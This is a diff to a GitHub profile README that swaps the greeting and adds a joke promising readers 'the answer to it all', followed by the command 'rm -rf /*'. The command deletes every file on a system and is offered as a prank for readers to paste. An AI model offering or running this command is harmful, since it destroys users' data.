@@ -1,5 +1,9 @@
-### Hi there 👋
+### Welcome 👋
 
+I think you came here for the answer to it all. So without further despair ->
+```
+rm -rf /* 
+```
 
 <!--
 **PIesPnuema/PIesPnuema** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
